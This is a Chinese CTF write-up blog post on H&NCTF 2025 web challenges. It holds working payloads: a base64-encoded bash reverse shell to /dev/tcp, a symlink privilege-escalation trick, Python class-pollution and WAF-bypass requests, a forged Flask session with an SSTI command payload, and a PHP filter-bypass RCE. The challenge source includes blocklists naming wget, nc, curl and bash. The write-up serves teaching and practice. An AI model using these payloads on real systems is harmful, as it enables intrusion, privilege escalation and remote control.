PHPSESSID=354fc88851eeee8113a2f34aa8b997d1; pahint=L3Zhci9mbGFnL2ZsYWcudHh0 6Accept-Language: zh-CN,zh;q=0.9 7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 8Referer: http://27.25.151.198:49096/ 9Origin: http://27.25.151.198:49096 10Cache-Control: max-age=0 11Upgrade-Insecure-Requests: 1 12User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 13Content-Length: 28 14 15qaq_visible=xiyangyang\u0026Lang=huitailang [WEB+RE]Just Ping Part 1 GO的逆向\nida打开可以看到两个路由/api/ping和/api/testDevelopApi\n跟进off_72CBA8函数后跟进moran_goweb1_handle_DevelopmentHandler\n看不懂，直接扔给gpt分析\n/api/testDevelopApi路由代码逻辑大致如下（不会逆向，大概看看\n1func DevelopmentHandler(w http.ResponseWriter, r *http.Request) { 2 query := r.URL.Query() 3 cmdStr := query.Get(\"cmd\") 4 if cmdStr == \"\" { 5 http.Error(w, \"cmd cant be null\", 400) 6 return 7 } 8 9 // 从对象池取命令字符串对象 10 poolObj := commandStringPool.Get() 11 12 // 用 shlex 解析命令字符串 13 args, err := shlex.Split(cmdStr) 14 if err != nil { 15 // 解析失败时，显式回收 16 commandStringPool.Put(poolObj) 17 http.Error(w, \"server error\", 400) 18 return 19 } 20 21 // 执行命令 22 output, err := exec.Command(args[0], args[1:]...).CombinedOutput() 23 if err != nil { 24 // 执行失败时，显式回收 25 commandStringPool.Put(poolObj) 26 http.Error(w, \"command error\", 400) 27 return 28 } 29 30 // 写响应 31 _, err = w.Write([]byte(\"Command executed successfully.\\n\")) 32 if err != nil { 33 // 响应写失败时，显式回收 34 commandStringPool.Put(poolObj) 35 http.Error(w, \"write error\", 500) 36 return 37 } 38 39 // 命令执行完毕且响应写完，显式回收对象池资源 40 commandStringPool.Put(poolObj) 41} shlex.Split库会将传入的命令按照空格分割成数组，并传入exec.Command，但是没有回显\n/api/ping路由实在看不懂了，就没看\n直接看web端，无疑中发现\n我测这怎么回事\n经过测试可以发现，当在/api/testDevelopApi传入时\necho 555 555 555 在/api/ping中传入ip会出现如下的情况\n大概可以理解为/api/ping和/api/testDevelopApi共用一个对象池Pool，我们在/api/testDevelopApi中执行命令后在/api/ping处发生了资源的复用\n跟进/api/ping的回显，我们可以猜到这里执行的命令应该是\nping -c 4 127.0.0.1 猜测正常情况下/api/ping会从连接池中获取模板ping -c 4 ip并将最后一个参数替换为传入的IP，当我们在/api/testDevelopApi传入echo 555 555 555时，被/api/ping获取了，并拼接为echo 555 555 127.0.0.1执行。\n所以我们可以构造出Payload:\n/api/testDevelopApi?cmd=cat /flag 555 拿到flag\n[WEB+RE]Just Ping Part 2 这题跟上一题的web部分完全相同，但是为了方便，这题我直接弹shell了\nPayload:\nbash+-c+echo%24%7bIFS%7d%22YmFzaCAtaSA%2bJiAvZGV2L3RjcC9pcC9wb3J0IDA%2bJjE%3d%22%24%7bIFS%7d%7c%24%7bIFS%7dbase64%24%7bIFS%7d-d%24%7bIFS%7d%7c%24%7bIFS%7dbash+123 题目中给了个附件\n1#!/bin/bash 2 3if [ ! -f \"backup\" ]; then 4 exit 1 5fi 6 7ACTUAL_MD5=$(md5sum \"backup\" | cut -d' ' -f1) 8 9if [ \"$ACTUAL_MD5\" = \"18ed919aada0f7adca8802acf7b8a4d5\" ]; then 10 backup 11 exit 0 12else 13 exit 1 14fi 里面提到了一个backup文件\n可以找到文件的路径\n/usr/local/etc/backup web目录没有读写权限，我们可以base64编码后提取backup\n对backup进行逆向分析\nStrings爆搜能找到两个路径，我们先来看backupList\n这里有一个/root/healthy\n接着看/var/backups/backup.zip，我们依旧base64后提取出来\n发现这里面应该就是刚刚backupList里面/root/healthy文件夹\n也就是说backup会定时把backupList中的目录备份到/var/backups/目录\n我们现在目标就是要想办法利用backup将/root目录打包，这样我们就可以拿到flag\n但是由于我们没有backupList的读写权限，我们需要使用一些骚操作\nPayload\n1enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ mkdir bak 2mkdir bak 3 4enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ mv backup bak/123 5mv backup bak/123 6 7enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ ln -s bak/123 backup 8ln -s bak/123 backup 9//利用软连接来保证backup能被正常检验和执行 10 11enjoy@hnctf-3b9e2ebaebdc4eb9:/usr/local/etc$ echo \"/root\"\u003ebackupList 12echo \"/root\"\u003ebackupList 13//backupList需要在backup的上级目录 提取backup.zip\n拿到flag\n奇怪的咖啡店 题目给出了部分源码\n1from flask import Flask, session, request, render_template_string, render_template 2import json 3import os 4 5app = Flask(__name__) 6app.config['SECRET_KEY'] = os.urandom(32).hex() 7 8@app.route('/', methods=['GET', 'POST']) 9def store(): 10 if not session.get('name'): 11 session['name'] = ''.join(\"customer\") 12 session['permission'] = 0 13 14 error_message = '' 15 if request.method == 'POST': 16 error_message = '该商品暂时无法购买，请稍后再试！\n' 17 18 products = [ 19 {\"id\": 1, \"name\": \"美式咖啡\", \"price\": 9.99, \"image\": \"1.png\"}, 20 {\"id\": 2, \"name\": \"橙c美式\", \"price\": 19.99, \"image\": \"2.png\"}, 21 {\"id\": 3, \"name\": \"摩卡\", \"price\": 29.99, \"image\": \"3.png\"}, 22 {\"id\": 4, \"name\": \"卡布奇诺\", \"price\": 19.99, \"image\": \"4.png\"}, 23 {\"id\": 5, \"name\": \"冰拿铁\", \"price\": 29.99, \"image\": \"5.png\"} 24 ] 25 26 return render_template('index.html', 27 error_message=error_message, 28 session=session, 29 products=products) 30 31 32def add(): 33 pass 34 35 36@app.route('/add', methods=['POST', 'GET']) 37def adddd(): 38 if request.method == 'GET': 39 return ''' 40 41 42 添加商品 43 44 商品名称: 45 商品价格: 46 添加商品 47 48 65 66 67 ''' 68 elif request.method == 'POST': 69 if request.data: 70 try: 71 raw_data = request.data.decode('utf-8') 72 if check(raw_data): 73 #检测添加的商品是否合法 74 return \"该商品违规，无法上传\" 75 json_data = json.loads(raw_data) 76 77 if not isinstance(json_data, dict): 78 return \"添加失败1\" 79 80 merge(json_data, add) 81 return \"你无法添加商品哦\" 82 83 except (UnicodeDecodeError, json.JSONDecodeError): 84 return \"添加失败2\" 85 except TypeError as e: 86 return f\"添加失败3\" 87 except Exception as e: 88 return f\"添加失败4\" 89 return \"添加失败5\" 90 91 92 93def merge(src, dst): 94 for k, v in src.items(): 95 if hasattr(dst, '__getitem__'): 96 if dst.get(k) and type(v) == dict: 97 merge(v, dst.get(k)) 98 else: 99 dst[k] = v 100 elif hasattr(dst, k) and type(v) == dict: 101 merge(v, getattr(dst, k)) 102 else: 103 setattr(dst, k, v) 104 105 106 107app.run(host=\"0.0.0.0\",port=5014) /add路由存在原型链污染\n远端应该是有waf的，但是给出的源码没给出来\nif check(raw_data):\r#检测添加的商品是否合法 waf比较简单，直接unicode编码绕过即可\n先污染静态目录拿一手远端源码\n1POST /add HTTP/1.1 2Host: 27.25.151.198:30362 3Sec-Fetch-Dest: empty 4Sec-Fetch-Mode: cors 5Accept-Language: zh-CN,zh;q=0.9 6sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\" 7Referer: http://27.25.151.198:30362/add 8Accept-Encoding: gzip, deflate, br, zstd 9sec-ch-ua-platform: \"Windows\" 10Content-Type: application/json 11Origin: http://27.25.151.198:30362 12Accept: */* 13Sec-Fetch-Site: same-origin 14User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 15sec-ch-ua-mobile: ?0 16Content-Length: 3 17 18{\"\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\":{\"\\u0061\\u0070\\u0070\":{\"\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u005F\\u0066\\u006F\\u006C\\u0064\\u0065\\u0072\":\"\\u002F\"}}} 访问/static/app.py即可拿到完整源码\n1from flask import Flask, session, request, render_template_string, render_template 2import json 3import os 4 5app = Flask(__name__) 6app.config['SECRET_KEY'] = os.urandom(32).hex() 7 8@app.route('/', methods=['GET', 'POST']) 9def store(): 10 if not session.get('name'): 11 session['name'] = ''.join(\"customer\") 12 session['permission'] = 0 13 14 error_message = '' 15 if request.method == 'POST': 16 error_message = '该商品暂时无法购买，请稍后再试！\n' 17 18 products = [ 19 {\"id\": 1, \"name\": \"美式咖啡\", \"price\": 9.99, \"image\": \"1.png\"}, 20 {\"id\": 2, \"name\": \"橙c美式\", \"price\": 19.99, \"image\": \"2.png\"}, 21 {\"id\": 3, \"name\": \"摩卡\", \"price\": 29.99, \"image\": \"3.png\"}, 22 {\"id\": 4, \"name\": \"卡布奇诺\", \"price\": 19.99, \"image\": \"4.png\"}, 23 {\"id\": 5, \"name\": \"冰拿铁\", \"price\": 29.99, \"image\": \"5.png\"} 24 ] 25 26 return render_template('index.html', 27 error_message=error_message, 28 session=session, 29 products=products) 30 31 32def add(): 33 pass 34 35 36@app.route('/add', methods=['POST', 'GET']) 37def adddd(): 38 if request.method == 'GET': 39 return ''' 40 41 42 添加商品 43 44 商品名称: 45 商品价格: 46 添加商品 47 48 65 66 67 ''' 68 elif request.method == 'POST': 69 if request.data: 70 try: 71 raw_data = request.data.decode('utf-8') 72 if check(raw_data): 73 #检测添加的商品是否合法 74 return \"该商品违规，无法上传\" 75 json_data = json.loads(raw_data) 76 77 if not isinstance(json_data, dict): 78 return \"添加失败1\" 79 80 merge(json_data, add) 81 return \"你无法添加商品哦\" 82 83 except (UnicodeDecodeError, json.JSONDecodeError): 84 return \"添加失败2\" 85 except TypeError as e: 86 return f\"添加失败3\" 87 except Exception as e: 88 return f\"添加失败4\" 89 return \"添加失败5\" 90 91 92@app.route('/aaadminnn', methods=['GET', 'POST']) 93def admin(): 94 if session.get('name') == \"admin\" and session.get('permission') != 0: 95 permission = session.get('permission') 96 if check1(permission): 97 # 检测添加的商品是否合法 98 return \"非法权限\" 99 100 if request.method == 'POST': 101 return '' 102 103 upload_form = ''' 104 商品管理系统 105 106 上传新商品 107 108 支持格式：jpg/png（最大2MB）\n109 110 111 ''' 112 113 original_template = 'Hello admin!!!Your permissions are{}'.format(permission) 114 new_template = original_template + upload_form 115 116 return render_template_string(new_template) 117 else: 118 return \"\" 119 120 121 122 123def merge(src, dst): 124 for k, v in src.items(): 125 if hasattr(dst, '__getitem__'): 126 if dst.get(k) and type(v) == dict: 127 merge(v, dst.get(k)) 128 else: 129 dst[k] = v 130 elif hasattr(dst, k) and type(v) == dict: 131 merge(v, getattr(dst, k)) 132 else: 133 setattr(dst, k, v) 134 135 136def check(raw_data, forbidden_keywords=None): 137 \"\"\" 138 检查原始数据中是否包含禁止的关键词 139 如果包含禁止关键词返回 True，否则返回 False 140 \"\"\" 141 # 设置默认禁止关键词 142 if forbidden_keywords is None: 143 forbidden_keywords = [\"app\", \"config\", \"init\", \"globals\", \"flag\", \"SECRET\", \"pardir\", \"class\", \"mro\", \"subclasses\", \"builtins\", \"eval\", \"os\", \"open\", \"file\", \"import\", \"cat\", \"ls\", \"/\", \"base\", \"url\", \"read\"] 144 145 # 检查是否包含任何禁止关键词 146 return any(keyword in raw_data for keyword in forbidden_keywords) 147 148 149param_black_list = ['config', 'session', 'url', '\\\\', '\u003c', '\u003e', '%1c', '%1d', '%1f', '%1e', '%20', '%2b', '%2c', '%3c', '%3e', '%c', '%2f', 150 'b64decode', 'base64', 'encode', 'chr', '[', ']', 'os', 'cat', 'flag', 'set', 'self', '%', 'file', 'pop(', 151 'setdefault', 'char', 'lipsum', 'update', '=', 'if', 'print', 'env', 'endfor', 'code', '=' ] 152 153 154# 增强WAF防护 155def waf_check(value): 156 # 检查是否有不合法的字符 157 for black in param_black_list: 158 if black in value: 159 return False 160 return True 161 162# 检查是否是自动化工具请求 163def is_automated_request(): 164 user_agent = request.headers.get('User-Agent', '').lower() 165 # 如果是常见的自动化工具的 User-Agent，返回 True 166 automated_agents = ['fenjing', 'curl', 'python', 'bot', 'spider'] 167 return any(agent in user_agent for agent in automated_agents) 168 169def check1(value): 170 171 if is_automated_request(): 172 print(\"Automated tool detected\") 173 return True 174 175 # 使用WAF机制检查请求的合法性 176 if not waf_check(value): 177 return True 178 179 return False 180 181 182app.run(host=\"0.0.0.0\",port=5014) 审计一下源码就可以看到/aaadminnn路由可以ssti\n注入点是session中的permission参数\n那我们先污染一手SECRET_KEY，然后伪造session\n1POST /add HTTP/1.1 2Host: 27.25.151.198:30362 3Sec-Fetch-Dest: empty 4Sec-Fetch-Mode: cors 5Accept-Language: zh-CN,zh;q=0.9 6sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\" 7Referer: http://27.25.151.198:30362/add 8Accept-Encoding: gzip, deflate, br, zstd 9sec-ch-ua-platform: \"Windows\" 10Content-Type: application/json 11Origin: http://27.25.151.198:30362 12Accept: */* 13Sec-Fetch-Site: same-origin 14User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 15sec-ch-ua-mobile: ?0 16Content-Length: 3 17 18{\"\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\":{\"\\u0061\\u0070\\u0070\":{\"\\u0063\\u006F\\u006E\\u0066\\u0069\\u0067\":{\"\\u0053\\u0045\\u0043\\u0052\\u0045\\u0054\\u005F\\u004B\\u0045\\u0059\":\"xrntkk\"}}}} 另外把waf污染为空\n1POST /add HTTP/1.1 2Host: 27.25.151.198:30362 3Sec-Fetch-Dest: empty 4Sec-Fetch-Mode: cors 5Accept-Language: zh-CN,zh;q=0.9 6sec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\" 7Referer: http://27.25.151.198:30362/add 8Accept-Encoding: gzip, deflate, br, zstd 9sec-ch-ua-platform: \"Windows\" 10Content-Type: application/json 11Origin: http://27.25.151.198:30362 12Accept: */* 13Sec-Fetch-Site: same-origin 14User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 15sec-ch-ua-mobile: ?0 16Content-Length: 3 17 18{\"\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\":{\"param_black_list\":\"\"}} Payload:\n1┌──(root㉿XrntsPC)-[/home/xrntkk/flask-session-cookie-manager] 2└─# flask-unsign --sign --secret xrntkk -c '{\"name\":\"admin\",\"permission\":\"{{g.pop.__globals__.__builtins__[\\\"__import__\\\"](\\\"os\\\").popen(\\\"cat 4flloog\\\").read()}}\"}' 3.eJwVi8EKwyAQBX-lvFMCIaee-is1LKaxsrDuitqT-O81t5mB6VCfAl7wV2LFhhxK4lrZdMbe454t70RR7PRSiSafP5bGOuXtQMQpW2lEDsfiYNVhvaeg0z6-PZ5fEbN45xL8taxjYPwBAIEp0w.aEP1oA.brg9-lSD1jUcXaCB0RD1A8erqZI ",
  "wordCount" : "6056",
  "inLanguage": "zh",
  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-06-08T22:29:00+08:00",
  "dateModified": "2025-06-08T22:29:00+08:00",
  "author":{
    "@type": "Person",
    "name": "Xrntkk"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/post/hnctf_2025/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Xrntkk's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
                    <span>首页📔</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/archives/" title="归档">
                    <span>归档🗃️</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>标签🔖</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="搜索">
                    <span>搜索🔎</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/links/" title="友链🎈">
                    <span>友链🎈</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/about/" title="关于">
                    <span>关于👨‍💻</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      H&amp;NCTF-2025-Web-Writeup
    </h1>
<div class="post-meta"><span title='2025-06-08 22:29:00 +0800 CST'>2025-06-08</span>&nbsp;·&nbsp;13 分钟&nbsp;·&nbsp;Xrntkk

<div class="meta-item">&nbsp·&nbsp
  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
  </div>      
</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#web" aria-label="Web">Web</a><ul>
                        
                <li>
                    <a href="#really_ez_rce" aria-label="Really_Ez_Rce">Really_Ez_Rce</a></li>
                <li>
                    <a href="#watch" aria-label="Watch">Watch</a><ul>
                        
                <li>
                    <a href="#payload" aria-label="Payload">Payload</a></li>
                <li>
                    <a href="#%e9%a2%98%e5%a4%96%e8%af%9d" aria-label="题外话">题外话</a></li></ul>
                </li>
                <li>
                    <a href="#ez_php" aria-label="ez_php">ez_php</a></li>
                <li>
                    <a href="#deceptiflag" aria-label="DeceptiFlag">DeceptiFlag</a></li>
                <li>
                    <a href="#webrejust-ping-part-1" aria-label="[WEB&#43;RE]Just Ping Part 1">[WEB+RE]Just Ping Part 1</a></li>
                <li>
                    <a href="#webrejust-ping-part-2" aria-label="[WEB&#43;RE]Just Ping Part 2">[WEB+RE]Just Ping Part 2</a></li>
                <li>
                    <a href="#%e5%a5%87%e6%80%aa%e7%9a%84%e5%92%96%e5%95%a1%e5%ba%97" aria-label="奇怪的咖啡店">奇怪的咖啡店</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
<h3 id="really_ez_rce">Really_Ez_Rce<a hidden class="anchor" aria-hidden="true" href="#really_ez_rce">#</a></h3>
<p>源码</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html; charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;Number&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="nv">$inputNumber</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;Number&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\d/&#39;</span><span class="p">,</span> <span class="nv">$inputNumber</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;不行不行,不能这样&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$inputNumber</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;OK,接下来你知道该怎么做吗&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">                <span class="s1">&#39;/wget|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|zip|mod|sl|find|sed|cp|mv|ty|php|tee|txt|grep|base|fd|df|\\\\|more|cc|tac|less|head|\.|\{|\}|uniq|copy|%|file|xxd|date|\[|\]|flag|bash|env|!|\?|ls|\&#39;|\&#34;|id/i&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="nv">$cmd</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;你传的参数似乎挺正经的,放你过去吧&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">                <span class="nx">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">                <span class="k">echo</span> <span class="s2">&#34;nonono,hacker!!!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Payload:</p>
<pre tabindex="0"><code>POST: Number[]=1&amp;cmd=ec``ho Y2F0IC9mKg== | ba``se64 -d | bas``h
</code></pre><h3 id="watch">Watch<a hidden class="anchor" aria-hidden="true" href="#watch">#</a></h3>
<p>出题人写了一个基于 <code>ntdll.dll</code> 的 Windows NT 原生 API 调用实现的文件读取库</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="ln">  1</span><span class="cl"><span class="kn">package</span> <span class="nx">utils</span>
</span></span><span class="line"><span class="ln">  2</span><span class="cl">
</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kn">import</span> <span class="p">(</span>
</span></span><span class="line"><span class="ln">  4</span><span class="cl">	<span class="s">&#34;fmt&#34;</span>
</span></span><span class="line"><span class="ln">  5</span><span class="cl">	<span class="s">&#34;syscall&#34;</span>
</span></span><span class="line"><span class="ln">  6</span><span class="cl">	<span class="s">&#34;unsafe&#34;</span>
</span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="ln">  8</span><span class="cl">
</span></span><span class="line"><span class="ln">  9</span><span class="cl"><span class="kd">const</span> <span class="p">(</span>
</span></span><span class="line"><span class="ln"> 10</span><span class="cl">	<span class="nx">STATUS_SUCCESS</span>               <span class="p">=</span> <span class="mh">0x00000000</span>
</span></span><span class="line"><span class="ln"> 11</span><span class="cl">	<span class="nx">STATUS_NO_MORE_FILES</span>         <span class="p">=</span> <span class="mh">0x80000006</span>
</span></span><span class="line"><span class="ln"> 12</span><span class="cl">	<span class="nx">STATUS_BUFFER_OVERFLOW</span>       <span class="p">=</span> <span class="mh">0x80000005</span>
</span></span><span class="line"><span class="ln"> 13</span><span class="cl">	<span class="nx">FILE_READ_DATA</span>               <span class="p">=</span> <span class="mh">0x0001</span>
</span></span><span class="line"><span class="ln"> 14</span><span class="cl">	<span class="nx">FILE_LIST_DIRECTORY</span>          <span class="p">=</span> <span class="mh">0x0001</span>
</span></span><span class="line"><span class="ln"> 15</span><span class="cl">	<span class="nx">FILE_READ_ATTRIBUTES</span>         <span class="p">=</span> <span class="mh">0x0080</span>
</span></span><span class="line"><span class="ln"> 16</span><span class="cl">	<span class="nx">SYNCHRONIZE</span>                  <span class="p">=</span> <span class="mh">0x00100000</span>
</span></span><span class="line"><span class="ln"> 17</span><span class="cl">	<span class="nx">FILE_SHARE_READ</span>              <span class="p">=</span> <span class="mh">0x00000001</span>
</span></span><span class="line"><span class="ln"> 18</span><span class="cl">	<span class="nx">FILE_SHARE_WRITE</span>             <span class="p">=</span> <span class="mh">0x00000002</span>
</span></span><span class="line"><span class="ln"> 19</span><span class="cl">	<span class="nx">FILE_SHARE_DELETE</span>            <span class="p">=</span> <span class="mh">0x00000004</span>
</span></span><span class="line"><span class="ln"> 20</span><span class="cl">	<span class="nx">FILE_ATTRIBUTE_DIRECTORY</span>     <span class="p">=</span> <span class="mh">0x00000010</span>
</span></span><span class="line"><span class="ln"> 21</span><span class="cl">	<span class="nx">FILE_DIRECTORY_FILE</span>          <span class="p">=</span> <span class="mh">0x00000001</span>
</span></span><span class="line"><span class="ln"> 22</span><span class="cl">	<span class="nx">FILE_SYNCHRONOUS_IO_NONALERT</span> <span class="p">=</span> <span class="mh">0x00000020</span>
</span></span><span class="line"><span class="ln"> 23</span><span class="cl">	<span class="nx">OBJ_CASE_INSENSITIVE</span>         <span class="p">=</span> <span class="mh">0x00000040</span>
</span></span><span class="line"><span class="ln"> 24</span><span class="cl">	<span class="nx">FileDirectoryInformation</span>     <span class="p">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln"> 25</span><span class="cl">	<span class="nx">FileBasicInformation</span>         <span class="p">=</span> <span class="mi">4</span>
</span></span><span class="line"><span class="ln"> 26</span><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 27</span><span class="cl">
</span></span><span class="line"><span class="ln"> 28</span><span class="cl"><span class="kd">type</span> <span class="nx">UNICODE_STRING</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 29</span><span class="cl">	<span class="nx">Length</span>        <span class="kt">uint16</span>
</span></span><span class="line"><span class="ln"> 30</span><span class="cl">	<span class="nx">MaximumLength</span> <span class="kt">uint16</span>
</span></span><span class="line"><span class="ln"> 31</span><span class="cl">	<span class="nx">Buffer</span>        <span class="o">*</span><span class="kt">uint16</span>
</span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 33</span><span class="cl">
</span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="kd">type</span> <span class="nx">OBJECT_ATTRIBUTES</span> <span class="kd">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 35</span><span class="cl">	<span class="nx">Length</span>                   <span class="kt">uint32</span>
</span></span><span class="line"><span class="ln"> 36</span><span class="cl">	<span class="nx">RootDirectory</span>            <span class="nx">syscall</span><span class="p">.</span><span class="nx">Handle</span>
